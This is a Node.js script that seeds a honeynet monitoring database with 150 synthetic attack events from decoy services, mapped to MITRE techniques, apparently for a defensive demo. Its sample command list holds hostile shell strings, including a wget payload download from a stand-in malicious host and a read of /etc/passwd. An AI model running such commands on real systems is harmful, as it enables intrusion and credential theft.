const { MongoClient } = require("mongodb");
const { mapAttack } = require("./mitre");

const MONGO_URL = process.env.MONGO_URL || "mongodb://mongodb:27017";

async function seedDemoData() {
  const client = new MongoClient(MONGO_URL);
  await client.connect();
  const db = client.db("honeynet");
  const events = db.collection("events");

  // Check if demo events already exist
  const existing = await events.countDocuments({ synthetic: true });
  if (existing > 0) {
    console.log(`Demo events already seeded (${existing} found).`);
    await client.close();
    return;
  }

  const decoys = ["cowrie", "web-portal", "heralding", "dionaea"];
  const protocols = ["ssh", "http", "ftp", "smb"];
  const eventTypes = ["login_attempt", "command", "scan", "payload_download"];
  const sampleIps = ["185.220.101.5", "45.154.255.88", "193.32.162.21", "91.240.118.25"];
  const sampleUsernames = ["root", "admin", "user", "guest", "postgres"];
  const samplePasswords = ["password123", "admin", "123456", "toor"];
  const sampleCommands = ["uname -a", "wget http://malicious.ip/payload", "cat /etc/passwd", "cd /tmp && ./exploit"];

  const batch = [];
  const now = Date.now();

  for (let i = 0; i < 150; i++) {
    const decoy = decoys[Math.floor(Math.random() * decoys.length)];
    const protocol = protocols[Math.floor(Math.random() * protocols.length)];
    const event_type = eventTypes[Math.floor(Math.random() * eventTypes.length)];
    const src_ip = sampleIps[Math.floor(Math.random() * sampleIps.length)];
    const timestamp = new Date(now - Math.floor(Math.random() * 30 * 86400000));

    const doc = {
      id: `demo-${i + 1}`,
      synthetic: true,
      decoy,
      protocol,
      event_type,
      src_ip,
      timestamp,
      username: event_type === "login_attempt" ? sampleUsernames[Math.floor(Math.random() * sampleUsernames.length)] : null,
      password: event_type === "login_attempt" ? samplePasswords[Math.floor(Math.random() * samplePasswords.length)] : null,
      command: event_type === "command" ? sampleCommands[Math.floor(Math.random() * sampleCommands.length)] : null,
      session: ["cowrie", "heralding"].includes(decoy) ? `demo-sess-${i % 10}` : null,
    };

    doc.attack = mapAttack(doc);
    batch.push(doc);
  }

  await events.insertMany(batch);
  console.log(`Successfully seeded ${batch.length} synthetic demo events.`);
  await client.close();
}

if (require.main === module) {
  seedDemoData().catch(console.error);
}

module.exports = { seedDemoData };